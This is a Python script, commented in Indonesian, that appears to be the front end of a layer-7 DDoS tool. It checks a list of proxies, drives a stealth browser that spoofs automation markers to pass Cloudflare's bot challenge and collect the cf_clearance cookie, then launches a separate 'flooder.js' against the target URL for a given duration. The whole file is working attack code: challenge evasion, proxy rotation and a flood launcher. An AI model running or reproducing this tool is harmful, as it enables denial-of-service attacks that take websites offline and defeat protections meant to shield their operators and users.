import asyncio
import subprocess
import sys
import random
import os
import aiohttp
import time
from dataclasses import dataclass
from typing import Any, Dict, List, Optional

from camoufox.async_api import AsyncCamoufox
from browserforge.fingerprints import Screen
from colorama import init, Fore, Style

init(autoreset=True)

async def check_proxy_alive(proxy: str, timeout: int = 10) -> bool:
    """Mengecek apakah proxy masih hidup"""
    try:
        proxy_url = f"http://{proxy}"
        connector = aiohttp.ProxyConnector.from_url(proxy_url)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=timeout),
            headers={
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'DNT': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        ) as session:
            # Coba ke httpbin.org terlebih dahulu dengan HTTP/2
            try:
                async with session.get("https://httpbin.org/ip", timeout=timeout, ssl=False) as response:
                    if response.status == 200:
                        data = await response.json()
                        print(f"{Fore.GREEN}[proxy-check]{Style.RESET_ALL} {proxy} - Alive (httpbin.org) - HTTP/2 - {timeout}s")
                        return True
            except:
                pass
            
            # Jika httpbin gagal, coba ke google.com dengan HTTP/2
            try:
                async with session.get("https://www.google.com", timeout=timeout, ssl=False) as response:
                    if response.status == 200:
                        print(f"{Fore.GREEN}[proxy-check]{Style.RESET_ALL} {proxy} - Alive (google.com) - HTTP/2 - {timeout}s")
                        return True
            except:
                pass
                
    except Exception as e:
        pass
    
    print(f"{Fore.RED}[proxy-check]{Style.RESET_ALL} {proxy} - Dead ({timeout}s timeout)")
    return False

async def check_proxies_alive(proxies: List[str], max_concurrent: int = 10, save_alive: bool = True, check_all: bool = False) -> List[str]:
    """Mengecek proxy dan mengembalikan yang masih hidup"""
    if check_all:
        print(f"{Fore.YELLOW}[proxy-check]{Style.RESET_ALL} Checking all {len(proxies)} proxies...")
    else:
        print(f"{Fore.YELLOW}[proxy-check]{Style.RESET_ALL} Checking proxies (will stop after finding alive one)...")
    
    alive_proxies = []
    semaphore = asyncio.Semaphore(max_concurrent)
    
    async def check_single_proxy(proxy: str):
        async with semaphore:
            if await check_proxy_alive(proxy):
                alive_proxies.append(proxy)
                # Jika tidak check_all dan sudah menemukan proxy hidup, hentikan pengecekan
                if not check_all and len(alive_proxies) >= 1:
                    return True
        return False
    
    if check_all:
        # Cek semua proxy secara concurrent
        tasks = [check_single_proxy(proxy) for proxy in proxies]
        await asyncio.gather(*tasks)
    else:
        # Cek proxy satu per satu sampai menemukan yang hidup
        for proxy in proxies:
            if await check_single_proxy(proxy):
                print(f"{Fore.GREEN}[proxy-check]{Style.RESET_ALL} Found alive proxy, stopping check...")
                break
    
    print(f"{Fore.GREEN}[proxy-check]{Style.RESET_ALL} Found {len(alive_proxies)} alive proxies")
    
    # Simpan proxy yang masih hidup ke file
    if save_alive and alive_proxies:
        try:
            with open("alive_proxies.txt", "w") as f:
                for proxy in alive_proxies:
                    f.write(f"{proxy}\n")
            print(f"{Fore.GREEN}[proxy-check]{Style.RESET_ALL} Alive proxies saved to alive_proxies.txt")
        except Exception as e:
            print(f"{Fore.RED}[proxy-check]{Style.RESET_ALL} Failed to save alive proxies: {e}")
    
    return alive_proxies

def load_proxies(proxy_file: str) -> List[str]:
    """Membaca proxy dari file"""
    proxies = []
    try:
        with open(proxy_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and ':' in line and not line.startswith('#'):
                    proxies.append(line)
        print(f"{Fore.GREEN}[proxy]{Style.RESET_ALL} Loaded {len(proxies)} proxies from {proxy_file}")
        return proxies
    except FileNotFoundError:
        print(f"{Fore.RED}[error]{Style.RESET_ALL} Proxy file not found: {proxy_file}")
        return []
    except Exception as e:
        print(f"{Fore.RED}[error]{Style.RESET_ALL} Error loading proxy file: {e}")
        return []

def get_random_proxy(proxies: List[str]) -> Optional[str]:
    """Mendapatkan proxy acak dari list"""
    if not proxies:
        return None
    return random.choice(proxies)

@dataclass
class CloudflareCookie:
    name: str
    value: str
    domain: str
    path: str
    expires: int
    http_only: bool
    secure: bool
    same_site: str

    @classmethod
    def from_json(cls, cookie_data: Dict[str, Any]) -> "CloudflareCookie":
        return cls(
            name=cookie_data.get("name", ""),
            value=cookie_data.get("value", ""),
            domain=cookie_data.get("domain", ""),
            path=cookie_data.get("path", "/"),
            expires=cookie_data.get("expires", 0),
            http_only=cookie_data.get("httpOnly", False),
            secure=cookie_data.get("secure", False),
            same_site=cookie_data.get("sameSite", "Lax"),
        )

class CloudflareSolver:
    def __init__(self, sleep_time=3, headless=True, os=None, debug=False, retries=10, proxies=None):
        self.cf_clearance = None
        self.sleep_time = sleep_time
        self.headless = headless
        self.os = os or ["windows"]
        self.debug = debug
        self.retries = retries
        self.proxies = proxies or []

    async def _find_and_click_challenge_frame(self, page):
        for frame in page.frames:
            if frame.url.startswith("https://challenges.cloudflare.com"):
                frame_element = await frame.frame_element()
                box = await frame_element.bounding_box()
                checkbox_x = box["x"] + box["width"] / 8
                checkbox_y = box["y"] + box["height"] / 2

                await asyncio.sleep(random.uniform(1.5, 2.5))
                await page.mouse.click(x=checkbox_x, y=checkbox_y)
                return True
        return False

    async def solve(self, link: str):
        proxy = get_random_proxy(self.proxies)
        if proxy:
            print(f"{Fore.CYAN}[proxy]{Style.RESET_ALL} Using proxy: {proxy}")
        
        try:
            print(f"{Fore.GREEN}[info]{Style.RESET_ALL} Browser started")
            
            # Menyiapkan argumen browser
            browser_args = [
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-infobars",
                "--start-maximized",
                "--lang=en-US,en;q=0.9",
                "--disable-blink-features",
                "--disable-web-security",
                "--disable-features=IsolateOrigins,site-per-process",
                "--window-size=1920,1080",
            ]
            
            # Menambahkan proxy jika tersedia
            if proxy:
                browser_args.append(f"--proxy-server={proxy}")
            
            async with AsyncCamoufox(
                headless=self.headless,
                os=self.os,
                screen=Screen(max_width=1920, max_height=1080),
                args=browser_args
            ) as browser:
                page = await browser.new_page()
                await asyncio.sleep(random.uniform(1, 2))

                await page.goto(link)
                await asyncio.sleep(random.uniform(1.5, 2.5))

                await page.add_init_script("""
                Object.defineProperty(navigator, 'webdriver', { get: () => false });
                """)

                await page.evaluate("""
                () => {
                    Object.defineProperty(navigator, 'platform', { get: () => 'Win32' });
                    Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
                    Object.defineProperty(navigator, 'plugins', { get: () => [1,2,3,4,5] });
                }
                """)

                title = await page.title()
                print(f"{Fore.YELLOW}[info]{Style.RESET_ALL} Navigated: {title}")

                for _ in range(self.retries):
                    if await self._find_and_click_challenge_frame(page):
                        await asyncio.sleep(random.uniform(2, 3.0))
                        break
                    await asyncio.sleep(random.uniform(1, 1.5))

                await asyncio.sleep(random.uniform(1, 2))
                solved_title = await page.title()
                print(f"{Fore.YELLOW}[info]{Style.RESET_ALL} Solved title: {solved_title}")

                cookies = await page.context.cookies()
                ua = await page.evaluate("() => navigator.userAgent")

                cf_cookie = next((c for c in cookies if c["name"] == "cf_clearance"), None)
                if cf_cookie:
                    self.cf_clearance = CloudflareCookie.from_json(cf_cookie)
                    print(f"{Fore.GREEN}[solver]{Style.RESET_ALL} Cookie: {self.cf_clearance.value}")
                else:
                    print(f"{Fore.RED}[solver]{Style.RESET_ALL} cf_clearance not found")
                    return None, None, proxy

                print(f"{Fore.GREEN}[solver]{Style.RESET_ALL} User-Agent: {ua}")
                print(f"{Fore.YELLOW}[info]{Style.RESET_ALL} Browser stopped")
                await asyncio.sleep(random.uniform(0.8, 1.2))

                return self.cf_clearance.value, ua, proxy

        except Exception as e:
            print(f"{Fore.RED}[error]{Style.RESET_ALL} Error solving {link} - {e}")
            return None, None, proxy

async def main(url: str, duration: int, proxy_file: Optional[str] = None, check_all: bool = False, show_log: bool = False):
    # Load proxies jika file proxy diberikan
    proxies = []
    if proxy_file:
        raw_proxies = load_proxies(proxy_file)
        if raw_proxies:
            print(f"{Fore.YELLOW}[proxy-check]{Style.RESET_ALL} Starting proxy check...")
            proxies = await check_proxies_alive(raw_proxies, check_all=check_all)
            if not proxies:
                print(f"{Fore.RED}[error]{Style.RESET_ALL} No alive proxies found, continuing without proxy")
        else:
            print(f"{Fore.RED}[error]{Style.RESET_ALL} No valid proxies found, continuing without proxy")
    
    solver = CloudflareSolver(proxies=proxies)
    max_attempts = 10
    cookie = None
    ua = None
    used_proxy = None

    for attempt in range(1, max_attempts + 1):
        print(f"{Fore.CYAN}[attempt]{Style.RESET_ALL} Attempt {attempt} to solve Cloudflare")
        cookie, ua, used_proxy = await solver.solve(url)
        if cookie and ua:
            break
        print(f"{Fore.RED}[retry]{Style.RESET_ALL} Retry after failure...")

    if not cookie or not ua:
        print(f"{Fore.RED}[error]{Style.RESET_ALL} Failed to solve Cloudflare after {max_attempts} attempts")
        return

    print(f"[*] cf_clearance: {cookie}")
    print(f"[*] User-Agent: {ua}")
    if used_proxy:
        print(f"[*] Proxy used: {used_proxy}")
    print(f"[*] Starting flooder for {duration} seconds...\n")

    parcok = f"cf_clearance={cookie}"

    # Menyiapkan argumen untuk flooder
    args = [
        "node", "flooder.js", url, str(duration), parcok, ua
    ]
    
    # Menambahkan proxy ke flooder jika tersedia
    if used_proxy:
        args.append(used_proxy)
    
    # Menambahkan -log flag jika diinginkan
    if show_log:
        args.append("-log")

    proc = subprocess.Popen(
       args,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    for line in proc.stdout:
         print(line, end='')

    proc.wait()
    print("[*] Flooder selesai")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"{Fore.RED}Usage:{Style.RESET_ALL} python3 browser.py <url> <duration_in_seconds> [proxy_file] [--check-all] [--log]")
        print(f"{Fore.YELLOW}Example:{Style.RESET_ALL} python3 browser.py https://captcha.rapidreset.net 120 proxy.txt")
        print(f"{Fore.YELLOW}Example:{Style.RESET_ALL} python3 browser.py https://captcha.rapidreset.net 120 /root/methods/layer7/proxy.txt")
        print(f"{Fore.YELLOW}Example:{Style.RESET_ALL} python3 browser.py https://captcha.rapidreset.net 120 proxy.txt --check-all")
        print(f"{Fore.YELLOW}Example:{Style.RESET_ALL} python3 browser.py https://captcha.rapidreset.net 120 proxy.txt --log")
        sys.exit(1)

    url = sys.argv[1]
    try:
        duration = int(sys.argv[2])
    except ValueError:
        print(f"{Fore.RED}Error:{Style.RESET_ALL} Durasi harus berupa angka (dalam detik)")
        sys.exit(1)
    
    # Proxy file opsional
    proxy_file = None
    check_all = False
    show_log = False
    
    for i in range(3, len(sys.argv)):
        if sys.argv[i] == "--check-all":
            check_all = True
        elif sys.argv[i] == "--log":
            show_log = True
        elif not proxy_file:
            proxy_file = sys.argv[i]

    asyncio.run(main(url, duration, proxy_file, check_all, show_log))
